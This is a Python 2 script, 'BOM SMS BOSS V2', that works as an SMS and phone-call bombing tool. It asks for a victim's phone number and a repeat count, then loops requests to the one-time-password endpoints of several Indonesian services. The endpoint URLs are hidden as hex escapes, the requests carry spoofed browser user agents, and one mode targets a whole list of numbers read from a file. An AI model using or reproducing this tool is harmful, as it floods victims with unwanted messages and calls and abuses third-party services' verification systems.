import urllib,urllib2,platform,time


if 'Windows' in platform.system():
    ua = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0'}
else:
    ua = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36'}

ulang = ''
while ulang != 'n' :
    print """
 ._________________.
 | _______________ |
 | I             I |
 | I BOM SMS     I |
 | I     <>      I |
 | I     BOSS V2 I |
 | I_____________I |
 !_________________!
    ._[_______]_.
.___|___________|___.
|::: ____           |
|    ~~~~ [CD-ROM]  |
!___________________!

########################################
#            BOM SMS BOSSS V2          #
# Author : X-Code 404 , ZahidCode      #
# Github : https://github.com/zahidin  #
# Team   : IDN HACKTIVIST              #
########################################
     """
    print "1) Sms Tri"
    print "2) Sms JD.id"
    print "3) Sms Phd.id"
    print "4) Sms Tokoepedia"
    print "5) Call Tokopedia"

    pilihan = input('BomSms> ')


    if pilihan == 1:
        number = raw_input('Target (ex:628999888):')
        limit = input('Limit :')
        for i in range(limit):
            data_post = {'msisdn':number}
            data_post = urllib.urlencode(data_post)
            url = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x67\x69\x73\x74\x72\x61\x73\x69\x2e\x74\x72\x69\x2e\x63\x6f\x2e\x69\x64\x2f\x64\x61\x66\x74\x61\x72\x2f\x67\x65\x6e\x65\x72\x61\x74\x65\x4f\x54\x50'
            req = urllib2.Request(url,data=data_post,headers=ua)
            res = urllib2.urlopen(req)
            print res.read().decode('utf-8')
        ulang = raw_input('Ulang (y/n) :')
    elif pilihan == 2:
        number = raw_input('Target (ex:628999888):')
        limit = input('Limit :')
        for i in range(limit):
            data_post = {'phone':number,'smsType':1}
            data_post = urllib.urlencode(data_post)
            url = '\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73'
            req = urllib2.Request(url,data=data_post,headers=ua)
            res = urllib2.urlopen(req)
            print res.read().decode('utf-8')
        ulang = raw_input('Ulang (y/n) :')
    elif pilihan == 3:
        number = raw_input('Target (ex:628999888):')
        limit = input('Limit :')
        for i in range(limit):
            data_post = {'phone_number':number}
            data_post = urllib.urlencode(data_post)
            url = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50'
            req = urllib2.Request(url,data=data_post,headers=ua)
            res = urllib2.urlopen(req)
            print res.read().decode('utf-8')
        ulang = raw_input('Ulang (y/n) :')
    elif pilihan == 4:
        number = raw_input('Target (ex:628999888):')
        limit = input('Limit :')
        for i in range(limit):
            data_post = {'msisdn':number,'accept':''}
            data_post = urllib.urlencode(data_post)
            url = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70'
            req = urllib2.Request(url,data=data_post,headers=ua)
            res = urllib2.urlopen(req)
            print res.read().decode('utf-8')
        ulang = raw_input('Ulang (y/n) :')
    elif pilihan == 5:
        print "1) Single"
        print "2) List"
        opsi = input('BomSms> ')
        if opsi == 1:
            number = raw_input('Target (ex:628999888):')
            data_post = {'msisdn':number,'accept':'call'}
            data_post = urllib.urlencode(data_post)
            url = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70'
            req = urllib2.Request(url,data=data_post,headers=ua)
            res = urllib2.urlopen(req)
            print res.read().decode('utf-8')
            ulang = raw_input('Ulang (y/n) :')
        elif opsi == 2:
            list_number = raw_input('List Target :')
            numbers = open(list_number,'r').read().splitlines()
            for i in numbers:
                data_post = {'msisdn':i,'accept':'call'}
                data_post = urllib.urlencode(data_post)
                url = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70'
                req = urllib2.Request(url,data=data_post,headers=ua)
                res = urllib2.urlopen(req)
                print res.read().decode('utf-8')
            ulang = raw_input('Ulang (y/n) :')    
        else :
            print "\n Nothing"
            exit()

    else:
        print "\n Nothing"
        exit()
